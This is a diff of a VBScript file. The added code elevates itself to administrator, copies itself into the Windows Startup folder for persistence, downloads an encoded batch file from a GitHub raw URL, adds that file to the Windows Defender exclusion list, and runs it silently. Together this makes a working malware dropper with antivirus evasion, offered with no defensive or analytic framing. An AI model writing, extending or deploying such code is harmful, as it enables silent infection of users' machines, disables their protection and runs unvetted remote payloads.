@@ -1,6 +1,28 @@
-' Define the URL of the encoded file!
+' Check if running as administrator
+If Not WScript.Arguments.Named.Exists("elevated") Then
+    Set objShell = CreateObject("Shell.Application")
+    ' Relaunch the script as Administrator
+    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
+    WScript.Quit
+End If
+
+' Create necessary objects
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+' Add this script to Windows Startup
+startupFolderPath = objShell.SpecialFolders("Startup")
+scriptName = objFSO.GetFileName(WScript.ScriptFullName)
+startupScriptPath = startupFolderPath & "\" & scriptName
+
+' Copy the script to the Startup folder if not already there
+If Not objFSO.FileExists(startupScriptPath) Then
+    objFSO.CopyFile WScript.ScriptFullName, startupScriptPath
+End If
+
+' Define the URL of the encoded file
 encodedFileUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encoded.txt"
-decodedFilePath = "C:\Users\Administrator\Downloads\decoded.bat"
+decodedFilePath = "C:\decoded.bat"
 
 ' Create XMLHTTP object to fetch the file
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
@@ -20,14 +42,18 @@ If objXMLHTTP.Status = 200 Then
     decodedContent = objNode.nodeTypedValue
 
     ' Write the decoded content to a temporary batch file
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
     Set objFile = objFSO.CreateTextFile(decodedFilePath, True)
     objFile.Write decodedContent
     objFile.Close
 
     ' Add the decoded batch file to antivirus exclusion list
-    Set objShell = CreateObject("WScript.Shell")
+    On Error Resume Next
     objShell.Run "powershell -Command Add-MpPreference -ExclusionPath " & Chr(34) & decodedFilePath & Chr(34), 0, True
+    If Err.Number <> 0 Then
+        MsgBox "Error adding exclusion: " & Err.Description
+        Err.Clear
+    End If
+    On Error GoTo 0
 
     ' Execute the batch file silently
     objShell.Run Chr(34) & decodedFilePath & Chr(34), 0, True
